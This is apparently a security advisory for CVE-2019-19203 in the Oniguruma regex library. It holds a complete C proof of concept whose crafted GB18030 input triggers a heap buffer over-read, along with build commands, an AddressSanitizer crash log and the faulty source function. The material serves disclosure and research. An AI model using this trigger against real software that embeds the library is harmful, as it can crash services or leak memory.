# CVE-2019-19203
An issue was discovered in Oniguruma 6.x before 6.9.4_rc2. In the function gb18030_mbc_enc_len in file gb18030.c, a UChar pointer is dereferenced without checking if it passed the end of the matched string. This leads to a heap-based buffer over-read.

Researcher: **ManhND of The Tarantula Team, VinCSS (a member of Vingroup)**

## What is Oniguruma
Oniguruma by K. Kosako is a BSD licensed regular expression library that supports a variety of character encodings. The Ruby programming language, in version 1.9, as well as PHP's multi-byte string module (since PHP5), use Oniguruma as their regular expression engine. It is also used in products such as Atom, GyazMail Take Command Console, Tera Term, TextMate, Sublime Text and SubEthaEdit.

## Proof of Concept
Source code:
```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "oniguruma.h"

static int
search(regex_t* reg, unsigned char* str, unsigned char* end)
{
  int r;
  unsigned char *start, *range;
  OnigRegion *region;

  region = onig_region_new();

  start = str;
  range = end;
  r = onig_search(reg, str, end, start, range, region, ONIG_OPTION_NONE);
  if (r >= 0 ) {
    int i;

    fprintf(stdout, "match at %d  (%s)\n", r,
            ONIGENC_NAME(onig_get_encoding(reg)));
    for (i = 0; i < region->num_regs; i++) {
      fprintf(stdout, "%d: (%d-%d)\n", i, region->beg[i], region->end[i]);
    }
  }
  else if (r == ONIG_MISMATCH) {
    fprintf(stdout, "search fail (%s)\n",
            ONIGENC_NAME(onig_get_encoding(reg)));
  }
  else { /* error */
    char s[ONIG_MAX_ERROR_MESSAGE_LEN];
    onig_error_code_to_str((UChar* )s, r);
    fprintf(stdout, "ERROR: %s\n", s);
    fprintf(stdout, "  (%s)\n", ONIGENC_NAME(onig_get_encoding(reg)));
    
    onig_region_free(region, 1 /* 1:free self, 0:free contents only */);
    return -1;
  }

  onig_region_free(region, 1 /* 1:free self, 0:free contents only */);
  return 0;
}

int main(int argc, char* argv[])
{
  int r;
  regex_t* reg;
  OnigErrorInfo einfo;

  char *pattern = (char*)malloc(6);
  memcpy(pattern, "[\\W]\\w", 6);
  char *pattern_end = pattern + 6;
  OnigEncodingType *enc = ONIG_ENCODING_GB18030;

  char* str = (char*)malloc(2);
  memcpy(str, "\xe1\xe1", 2);
  char* str_end = str+2;

  onig_initialize(&enc, 1);
  r = onig_new(&reg, (unsigned char *)pattern, (unsigned char *)pattern_end,
               ONIG_OPTION_NONE, enc, ONIG_SYNTAX_DEFAULT, &einfo);
  if (r != ONIG_NORMAL) {
    char s[ONIG_MAX_ERROR_MESSAGE_LEN];
    onig_error_code_to_str((UChar* )s, r, &einfo);
    fprintf(stdout, "ERROR: %s\n", s);
    onig_end();

    if (r == ONIGERR_PARSER_BUG ||
        r == ONIGERR_STACK_BUG  ||
        r == ONIGERR_UNDEFINED_BYTECODE ||
        r == ONIGERR_UNEXPECTED_BYTECODE) {
      return -2;
    }
    else
      return -1;
  }

  if (onigenc_is_valid_mbc_string(enc, str, str_end) != 0) {
    r = search(reg, str, str_end);
  } else {
    fprintf(stdout, "Invalid string\n");
  }

  onig_free(reg);
  onig_end();
  return 0;
}
```
Compilation of Oniguruma and the PoC:
```
./configure CC=gcc CFLAGS="-O0 -ggdb3 -fsanitize=address" LDFLAGS="-O0 -ggdb3 -fsanitize=address" && make -j4
gcc -fsanitize=address -O0 -I./oniguruma-gcc-asan/src -ggdb3 poc-gb18030_mbc_enc_len.c ./oniguruma-gcc-asan/src/.libs/libonig.a -o PoC
```
Crash log:
```
root@manh-ubuntu16:~/fuzz/fuzz_oniguruma# ./PoC
=================================================================
==5543==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000efd2 at pc 0x000000487a3c bp 0x7ffe87bb1ea0 sp 0x7ffe87bb1e90
READ of size 1 at 0x60200000efd2 thread T0
    #0 0x487a3b in gb18030_mbc_enc_len /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/gb18030.c:72
    #1 0x47bedd in onigenc_mbn_mbc_to_code /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regenc.c:774
    #2 0x487d37 in gb18030_mbc_to_code /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/gb18030.c:121
    #3 0x45eadc in match_at /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regexec.c:3271
    #4 0x4743bc in search_in_range /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regexec.c:5382
    #5 0x4732b3 in onig_search /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/regexec.c:5168
    #6 0x401228 in search /root/fuzz/fuzz_oniguruma/poc-gb18030_mbc_enc_len.c:17
    #7 0x401918 in main /root/fuzz/fuzz_oniguruma/poc-gb18030_mbc_enc_len.c:80
    #8 0x7fed5c75c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #9 0x401048 in _start (/root/fuzz/fuzz_oniguruma/PoC+0x401048)

0x60200000efd2 is located 0 bytes to the right of 2-byte region [0x60200000efd0,0x60200000efd2)
allocated by thread T0 here:
    #0 0x7fed5cb9e602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)
    #1 0x401793 in main /root/fuzz/fuzz_oniguruma/poc-gb18030_mbc_enc_len.c:56
    #2 0x7fed5c75c82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

SUMMARY: AddressSanitizer: heap-buffer-overflow /root/fuzz/fuzz_oniguruma/oniguruma-gcc-asan/src/gb18030.c:72 gb18030_mbc_enc_len
Shadow bytes around the buggy address:
  0x0c047fff9da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9db0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa 04 fa
  0x0c047fff9dc0: fa fa 00 00 fa fa 00 04 fa fa 00 00 fa fa 06 fa
  0x0c047fff9dd0: fa fa 00 00 fa fa 06 fa fa fa 00 00 fa fa 04 fa
  0x0c047fff9de0: fa fa 00 00 fa fa 00 01 fa fa 00 00 fa fa 00 00
=>0x0c047fff9df0: fa fa 05 fa fa fa 00 00 fa fa[02]fa fa fa 06 fa
  0x0c047fff9e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
==5543==ABORTING
```
## Root cause
Referenced source code version: **ca7ddbd858dcdc8322d619cf41ab125a2603a0d4**
In gb18030_mbc_enc_len, p ++ then p is dereferenced without checking if it passes the end of the UChar string, which leads to buffer over-read.
```C
static int
gb18030_mbc_enc_len(const UChar* p)
{
  if (GB18030_MAP[*p] != CM)
    return 1;

  p++;
  if (GB18030_MAP[*p] == C4)
    return 4;

  return 2;
}
```
